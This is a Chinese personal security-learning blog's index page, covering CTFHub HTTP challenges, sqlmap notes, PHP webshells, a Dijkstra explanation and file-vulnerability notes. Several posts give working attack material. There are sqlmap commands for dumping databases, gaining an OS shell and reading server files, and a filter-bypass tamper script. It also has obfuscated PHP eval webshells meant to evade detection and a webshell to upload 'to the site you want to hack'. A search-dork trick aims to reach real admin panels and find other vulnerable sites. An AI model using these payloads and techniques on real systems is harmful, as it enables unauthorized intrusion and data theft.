<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="Here recording my growth of technology and hope you can gain something here."><meta name="keywords" content=""><meta name="author" content="George"><meta name="copyright" content="George"><title>Welcome to my blog. | A.</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.6.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.6.1"><link rel="dns-prefetch" href="https://cdn.staticfile.org"><link rel="dns-prefetch" href="https://cdn.bootcss.com"><link rel="dns-prefetch" href="https://creativecommons.org"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  }
} </script><meta name="generator" content="Hexo 4.2.0"></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar"><div class="author-info"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">George</div><div class="author-info__description text-center">Here recording my growth of technology and hope you can gain something here.</div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">76</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">18</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">Categories</span><span class="pull-right">17</span></a></div></div></div><nav id="nav" style="background-image: url(https://Albatross-G.github.io/img/a1.png)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">A.</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus"><a class="site-page social-icon search"><i class="fa fa-search"></i><span> Search</span></a><a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a></span></div><div id="site-info"><div id="site-title">A.</div><div id="site-sub-title">Welcome to my blog.</div></div></nav><div id="content-outer"><div class="layout" id="content-inner"><div class="recent-post-item article-container"><a class="article-title" href="/2020/05/26/Http%E5%8D%8F%E8%AE%AE%E7%9C%9F%E9%A2%98/">Http协议真题</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-05-26</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/ctfhub/">ctfhub</a></span><div class="content"><p>这两天在ctfhub上刷了http有关的五道题，还是蛮有收获的【毕竟是个菜逼，学啥都有收获】，记录一下学到的一些东西，</p>
<h2 id="请求方式"><a href="#请求方式" class="headerlink" title="请求方式"></a>请求方式</h2><p>这道题要求把请求方式换成“CTFHUB”</p>
<p>最简单的一种方法当然是burpsuite抓包，把GET换成CTFHUB</p>
<p>但是在网上还看到一种方法，就是用curl命令修改请求的方法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v -X CTFHUB http:&#x2F;&#x2F;challenge-74da4bfe747dae2a.sandbox.ctfhub.com:10080&#x2F;index.php</span><br></pre></td></tr></table></figure>

<p>对于curl的一些参数有很多就不一一列举了，这里给一篇写的超详细的<a href="http://www.ruanyifeng.com/blog/2019/09/curl-reference.html" target="_blank" rel="noopener">大作</a></p>
<h2 id="302重定向"><a href="#302重定向" class="headerlink" title="302重定向"></a>302重定向</h2><p>这题就是抓个包防止它重定向就好了</p>
<h2 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h2><p>第一种方法：抓个包，把admin的值改成1</p>
<p><img src="/2020/05/26/Http%E5%8D%8F%E8%AE%AE%E7%9C%9F%E9%A2%98/1.png" alt="1"></p>
<p>第二种方法：使用cookie修改插件【Cookie Quick Manager】改cookie</p>
<p><img src="/2020/05/26/Http%E5%8D%8F%E8%AE%AE%E7%9C%9F%E9%A2%98/2.png" alt="2"></p>
<h2 id="HTTP基本认证"><a href="#HTTP基本认证" class="headerlink" title="HTTP基本认证"></a>HTTP基本认证</h2><p>HTTP基本认证的过程是这样的：</p>
<p><img src="/2020/05/26/Http%E5%8D%8F%E8%AE%AE%E7%9C%9F%E9%A2%98/3.png" alt="3"></p>
<ol>
<li>客户端发生请求</li>
<li>服务器端返回401 Unauthorized，返回正文里包含 WWW-Authenticate: Basic realm=”xxx”，xxx表示要用哪个域的用户名和密码</li>
<li>客户端按要求在请求正文里加入 Authorization： Basic YMxhZGpbj==  ，其中“YMxhZGpbj==”通过base64解码后为“admin:password”</li>
<li>服务器端返回成功200</li>
</ol>
<p>那这道题就是拿着他给的词典在burpsuite上跑就行了，不过也学到了个小技巧</p>
<p><img src="/2020/05/26/Http%E5%8D%8F%E8%AE%AE%E7%9C%9F%E9%A2%98/4.png" alt="4"></p>
<p>在Payload Processing模块，可以对变量进行加工，而且以上下为加工顺序，这里就表示先加前缀“admin:”然后对“admin:xxx”整块进行base64加密。</p>
<h2 id="响应包源代码"><a href="#响应包源代码" class="headerlink" title="响应包源代码"></a>响应包源代码</h2><p>这题没大明白像考察啥？F12一下就有flag了。。。</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/05/24/java%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E9%85%8D%E7%BD%AE/">java环境变量配置</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-05-24</time><div class="content"><p>啊啊啊啊啊啊啊啊今天装了jdk11但却发现burpsuite跑不了了淦。没办法只好装回jdk8，配环境变量时又出了好多问题，下面就记录一下以免下次继续。</p>
<p>首先是JAVA_HOME</p>
<p><img src="/2020/05/24/java%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E9%85%8D%E7%BD%AE/Snipaste_2020-05-24_21-36-07.png" alt="Snipaste_2020-05-24_21-36-07"></p>
<p>然后是classpath【记住这里一定要小写】</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.;%JAVA_HOME%\lib\dt.jar;%JAVA_HOME%\lib\tools.jar;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/java%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E9%85%8D%E7%BD%AE/2.png" alt="2"></p>
<p>然后在PATH里配置</p>
<p><img src="/2020/05/24/java%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E9%85%8D%E7%BD%AE/3.png" alt="3"></p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/05/23/sqlmap%E4%BD%BF%E7%94%A8/">sqlmap使用</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-05-23</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/%E7%B1%B3%E6%96%AF%E7%89%B9%E5%AE%89%E5%85%A8%E5%9F%B9%E8%AE%AD/">米斯特安全培训</a></span><div class="content"><h2 id="概览"><a href="#概览" class="headerlink" title="概览"></a>概览</h2><h3 id="对于GET请求的注入"><a href="#对于GET请求的注入" class="headerlink" title="对于GET请求的注入"></a>对于GET请求的注入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;127.0.0.1&#x2F;sql&#x2F;sql_1.php?id&#x3D;1&#39;&quot;</span><br></pre></td></tr></table></figure>

<h3 id="对于POST请求的注入"><a href="#对于POST请求的注入" class="headerlink" title="对于POST请求的注入"></a>对于POST请求的注入</h3><p>先把http头写入到同目录下的文件里【post.txt】</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;sql&#x2F;sql_post.php HTTP&#x2F;1.1</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Length: 6</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Cookie: __atuvc&#x3D;5%7C1</span><br><span class="line">Host: localhost</span><br><span class="line">Origin: http:&#x2F;&#x2F;localhost</span><br><span class="line">Referer: http:&#x2F;&#x2F;localhost&#x2F;sql&#x2F;sql_post.php</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;79.0.3945.117 Safari&#x2F;537.36</span><br><span class="line"></span><br><span class="line">id&#x3D;2</span><br></pre></td></tr></table></figure>

<p>其中post传输的数据与header要空一行，然后构建payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r &quot;post.txt&quot;</span><br></pre></td></tr></table></figure>

<h3 id="对于有表格的注入"><a href="#对于有表格的注入" class="headerlink" title="对于有表格的注入"></a>对于有表格的注入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;127.0.0.1&#x2F;sql&#x2F;sql_1.php&quot; --forms</span><br></pre></td></tr></table></figure>



<h2 id="对于GET的一次完整注入"><a href="#对于GET的一次完整注入" class="headerlink" title="对于GET的一次完整注入"></a>对于GET的一次完整注入</h2><ol>
<li><p>爆出数据库名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;sql&#x2F;sql_1.php?id&#x3D;1&quot; --dbs</span><br></pre></td></tr></table></figure>

<p>如果要爆出当前数据库名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;sql&#x2F;sql_1.php?id&#x3D;1&quot; --current-db</span><br></pre></td></tr></table></figure>
</li>
<li><p>爆出表名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;sql&#x2F;sql_1.php?id&#x3D;1&quot;  -D &quot;test&quot; --tables</span><br></pre></td></tr></table></figure>
</li>
<li><p>爆出列名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;sql&#x2F;sql_1.php?id&#x3D;1&quot;  -D &quot;test&quot; -T &quot;sql_1&quot; --columns</span><br></pre></td></tr></table></figure>
</li>
<li><p>爆出具体内容</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;sql&#x2F;sql_1.php?id&#x3D;1&quot;  -D &quot;test&quot; -T &quot;sql_1&quot; --dump</span><br></pre></td></tr></table></figure>

<p>如果爆出指定列内容</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;sql&#x2F;sql_1.php?id&#x3D;1&quot;  -D &quot;test&quot; -T &quot;sql_1&quot; -C &quot;name&quot; --dump</span><br></pre></td></tr></table></figure>

</li>
</ol>
<p>此次完整注入的原理可见下图</p>
<p><img src="/2020/05/23/sqlmap%E4%BD%BF%E7%94%A8/sql%E7%BB%93%E6%9E%84.jpg" alt="sql结构"></p>
<h2 id="获取shell权限"><a href="#获取shell权限" class="headerlink" title="获取shell权限"></a>获取shell权限</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;sql&#x2F;sql_1.php?id&#x3D;1&quot; --os-shell</span><br></pre></td></tr></table></figure>

<h2 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;sql&#x2F;sql_1.php?id&#x3D;1&quot; --file-read&#x3D;&quot;D:\phpstudy_pro\WWW\muma.php</span><br></pre></td></tr></table></figure>

<h2 id="多个链接注入"><a href="#多个链接注入" class="headerlink" title="多个链接注入"></a>多个链接注入</h2><p>可以将多个有注入点的链接写入txt文件保存到同目录下然后：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -m m.txt</span><br></pre></td></tr></table></figure>

<h2 id="关于burpsuite的log联合使用"><a href="#关于burpsuite的log联合使用" class="headerlink" title="关于burpsuite的log联合使用"></a>关于burpsuite的log联合使用</h2><p><img src="/2020/05/23/sqlmap%E4%BD%BF%E7%94%A8/4.png" alt="4"></p>
<p>找到底下的Proxy勾选Requests</p>
<p><img src="/2020/05/23/sqlmap%E4%BD%BF%E7%94%A8/5.png" alt="5"></p>
<p>保存到同目录下为burp.log，然后输入：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -l burp.log</span><br></pre></td></tr></table></figure>







<h2 id="tamper脚本的编写"><a href="#tamper脚本的编写" class="headerlink" title="tamper脚本的编写"></a>tamper脚本的编写</h2><p>tamper脚本实例【test.py】：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOWEST</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span><span class="params">(payload,**kwargs)</span>:</span></span><br><span class="line">    kwargs[<span class="string">'headers'</span>][<span class="string">'X-Forwarded-For'</span>] = <span class="string">"127.0.0.1"</span></span><br><span class="line">    payload = payload.lower()</span><br><span class="line">    payload = payload.replace(<span class="string">"and"</span>,<span class="string">"anandd"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"or"</span>,<span class="string">"oorr"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"select"</span>,<span class="string">"seleselectct"</span>)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure>

<p>php代码如下加入了过滤代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//filter</span></span><br><span class="line">$id = strtolower($id);</span><br><span class="line">$id = str_replace(<span class="string">"and"</span>,<span class="string">""</span>,$id);</span><br><span class="line">$id = str_replace(<span class="string">"or"</span>,<span class="string">""</span>,$id);</span><br><span class="line">$id = str_replace(<span class="string">"select"</span>,<span class="string">""</span>,$id);</span><br></pre></td></tr></table></figure>



<p>此时将test.py加入sqlmap的tamper文件夹下然后输入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py &quot;http:&#x2F;&#x2F;192.168.1.104&#x2F;sql&#x2F;sql_4.php?id&#x3D;2&quot; --tamper &quot;test&quot;</span><br></pre></td></tr></table></figure>

<p>即可跑出</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/05/21/NTFS%E6%96%87%E4%BB%B6%E6%B5%81/">NTFS文件流</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-05-21</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/%E7%B1%B3%E6%96%AF%E7%89%B9%E5%AE%89%E5%85%A8%E5%9F%B9%E8%AE%AD/">米斯特安全培训</a></span><div class="content"><p><a href="https://zhuanlan.zhihu.com/p/26108362" target="_blank" rel="noopener">知乎专栏</a></p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/05/18/%E7%BB%95%E8%BF%87%E5%AF%B9php%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E6%9F%A5%E6%9D%80%E7%9A%84%E6%96%B9%E6%B3%95/">绕过对php一句话木马查杀的方法</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-05-18</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/%E7%B1%B3%E6%96%AF%E7%89%B9%E5%AE%89%E5%85%A8%E5%9F%B9%E8%AE%AD/">米斯特安全培训</a></span><div class="content"><ol>
<li><p>改变大小写，然后strlower()</p>
</li>
<li><p>文本反转：strrev()</p>
</li>
<li><p>点号分割字符串：”a”.”b”</p>
</li>
<li><p>数组：array(“a”,”b”);   $a[0].$a[1]</p>
</li>
<li><p>干扰函数：var_dump()、print_r()</p>
</li>
<li><p>函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ag</span><span class="params">($a)</span></span>&#123;</span><br><span class="line">	@<span class="keyword">eval</span>($a);</span><br><span class="line">&#125;</span><br><span class="line">ag($_POST[<span class="string">'key'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>使用类</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">rg</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">ag</span><span class="params">($a)</span></span>&#123;</span><br><span class="line">		@<span class="keyword">eval</span>($a);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$key = <span class="keyword">new</span> rg;</span><br><span class="line">$key -&gt; ag($_POST[<span class="string">'key'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>改cknife里的配置【base_64一下】</p>
</li>
</ol>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/05/17/Dijkstra%E7%AE%97%E6%B3%95/">Dijkstra算法</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-05-17</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95%E4%B9%8B%E7%BE%8E/">数据结构与算法之美</a></span><div class="content"><p>当我们要寻找无权重边的最短路径时，我们常用广度优先搜索，即第一次遇到结点x就是x的最短路径【如社交媒体上的好友推荐】。但对于那些有权重边的最优解，我们就不能再用广度优先搜索了，因为最先到达x并不能代表这条路径就是最优解，因为每条路径的权重不同。如下图所示：</p>
<p>如果用广度优先搜索会先到达地点B，但地点B并不是最优解</p>
<p><img src="/2020/05/17/Dijkstra%E7%AE%97%E6%B3%95/2.jpg" alt="2"></p>
<p>这时我们就需要用到<strong>Dijkstra</strong>算法了：</p>
<h2 id="基本符号定义"><a href="#基本符号定义" class="headerlink" title="基本符号定义"></a>基本符号定义</h2><ol>
<li>source：表示图中的起始点，缩写是s。</li>
<li>weight[m，n]：表示从结点m到结点n的有向边之权重，如果m到n有多条边【一次到】则取权重最小的那条，缩写为w[m,n]。</li>
<li>min_weight[m]：保存了从s到任意结点的最小权重，缩写为mw[m]。其中mw[s]=0。</li>
<li>Finish：表示已经找到最小权重的结点之集合，一旦放入F，这个结点就不参与将来的计算，缩写为F。</li>
</ol>
<h2 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h2><ol>
<li>设置mw[s]=0。</li>
<li>往集合F里添加结点s，F包含且仅包含结点s。</li>
<li>假设结点s能直接到达的集合为M，对于其中的每一条边m，则把mw[m]设为w[s,m]，同时对其他s不能直接到的结点，将通路设为∞。</li>
</ol>
<h2 id="算法步骤"><a href="#算法步骤" class="headerlink" title="算法步骤"></a>算法步骤</h2><h3 id="1-查找最小mv"><a href="#1-查找最小mv" class="headerlink" title="1.查找最小mv"></a>1.查找最小mv</h3><p>当由一个点发散出去多个mw时，从mw数组中选择出其中的最小值【如mw[x]】，此最小值就是s到x</p>
<p>的最小权重，将其放入F数组中。此后x结点就不必被考虑了。</p>
<h3 id="2-更新权重"><a href="#2-更新权重" class="headerlink" title="2.更新权重"></a>2.更新权重</h3><p>然后看看新加入F的结点x，是不是可以直接到达其他结点。如果是，看看这些x到达其他通路的长度，是否比这些点之前的mw更小【mw[x]+w[x,y]&lt;mw[y]】，如果是，就替换这些点mw的值。</p>
<p>重复以上两步，知道集合F包含途中所有结点。</p>
<h2 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h2><p><img src="/2020/05/17/Dijkstra%E7%AE%97%E6%B3%95/1.jpg" alt="1"></p>
<table>
<thead>
<tr>
<th>步骤</th>
<th>F</th>
<th>mw</th>
<th>已确定的mw</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>s</td>
<td>mw[a]=0.5;mw[b]=0.3;mw[c]=0.2;mw[d]=0.4;其他mw=∞</td>
<td>空集</td>
</tr>
<tr>
<td>2</td>
<td>s,c</td>
<td>mw[a]=0.5;mw[b]=0.3;mw[d]=0.4;mw[f]=0.6;mw[h]=1.0;其他mw=∞</td>
<td>mw[c]=0.2</td>
</tr>
<tr>
<td>3</td>
<td>s,c,b</td>
<td>mw[a]=0.5;mw[d]=0.4;mw[f]=0.4;mw[h]=1.0;其他mw=∞</td>
<td>mw[c]=0.2;mw[b]=0.3</td>
</tr>
<tr>
<td>4</td>
<td>s,c,b,d</td>
<td>mw[a]=0.5;mw[f]=0.4;mw[h]=1.0;其他mw=∞</td>
<td>mw[c]=0.2;mw[b]=0.3;mv[d]=0.4</td>
</tr>
<tr>
<td>5</td>
<td>s,c,b,d,f</td>
<td>mw[a]=0.5;mw[h]=0.6;mw[e]=0.5;其他mw=∞</td>
<td>mw[c]=0.2;mw[b]=0.3;mv[d]=0.4;mw[f]=0.4</td>
</tr>
<tr>
<td>6</td>
<td>s,c,b,d,f,a</td>
<td>mw[h]=0.6;mw[e]=0.5;其他mw=∞</td>
<td>mw[c]=0.2;mw[b]=0.3;mv[d]=0.4;mw[f]=0.4;mw[a]=0.5;</td>
</tr>
<tr>
<td>7</td>
<td>s,c,b,d,f,a,e</td>
<td>mw[h]=0.6;mv[g]=0.6</td>
<td>mw[c]=0.2;mw[b]=0.3;mv[d]=0.4;mw[f]=0.4;mw[a]=0.5;mw[e]=0.5</td>
</tr>
<tr>
<td>8</td>
<td>s,c,b,d,f,a,e,h</td>
<td>mv[g]=0.6</td>
<td>mw[c]=0.2;mw[b]=0.3;mv[d]=0.4;mw[f]=0.4;mw[a]=0.5;mw[e]=0.5:mw[h]=0.6;</td>
</tr>
<tr>
<td>9</td>
<td>s,c,b,d,f,a,e,h,g</td>
<td>空集</td>
<td>mw[c]=0.2;mw[b]=0.3;mv[d]=0.4;mw[f]=0.4;mw[a]=0.5;mw[e]=0.5:mw[h]=0.6;mv[g]=0.6</td>
</tr>
</tbody></table>
<h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><p>正在现学JAVA，之后补上。</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/05/16/%E6%9C%89%E8%B6%A3%E7%9A%84%E5%B0%8F%E6%8A%80%E5%B7%A7/">有趣的小技巧</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-05-16</time><div class="content"><h2 id="通过禁用JS来实现直接进入管理员后台"><a href="#通过禁用JS来实现直接进入管理员后台" class="headerlink" title="通过禁用JS来实现直接进入管理员后台"></a>通过禁用JS来实现直接进入管理员后台</h2><ol>
<li><p>利用百度的高级搜索：想一些你觉得很多网站都会有的目录名和文件名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inurl:&#x2F;admin&#x2F;main.html</span><br></pre></td></tr></table></figure>
</li>
<li><p>禁用JS就可直接进入管理员后台查看一些数据</p>
</li>
<li><p>如果想把这个<strong>专用漏洞</strong>提升为<strong>通用漏洞</strong>，那么就在进入发现漏洞网页的首页，随意点进一个链接，一般会显示诸如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;index&#x2F;product.php?id&#x3D;24</span><br></pre></td></tr></table></figure>

<p>此时复制并再次使用百度</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inurl:&#x2F;product.php?id&#x3D;</span><br></pre></td></tr></table></figure>

<p>会显示出许多可能和该网站使用同一网站模板、存在同样漏洞的网站。</p>
</li>
</ol>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/05/16/%E6%96%87%E4%BB%B6%E6%9C%89%E5%85%B3%E6%BC%8F%E6%B4%9E/">文件有关漏洞</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-05-16</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/%E7%B1%B3%E6%96%AF%E7%89%B9%E5%AE%89%E5%85%A8%E5%9F%B9%E8%AE%AD/">米斯特安全培训</a></span><div class="content"><h2 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;xxx;</span><br></pre></td></tr></table></figure>

<h2 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h2><p>先找到下载链接，比如</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;abc&#x2F;hhh&#x2F;download.php?file&#x3D;.&#x2F;download&#x2F;abcdef.txt</span><br></pre></td></tr></table></figure>

<p>其中file=之后的内容可能会被加密。</p>
<p>改变file=之后的文件名就可以下载该文件</p>
<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h3 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#39;key&#39;]);?&gt;</span><br></pre></td></tr></table></figure>

<p>将此文件保存为1.php,然后将此文件上传到你想黑的网站里。</p>
<p>使用Cknife进行入侵，其中后面小空格里填上你一句话里的key。</p>
<blockquote>
<p>原理：eval函数执行函数内的操作，而当你把一段命令用POST传过去后，服务器端便会执行这段php代码</p>
</blockquote>
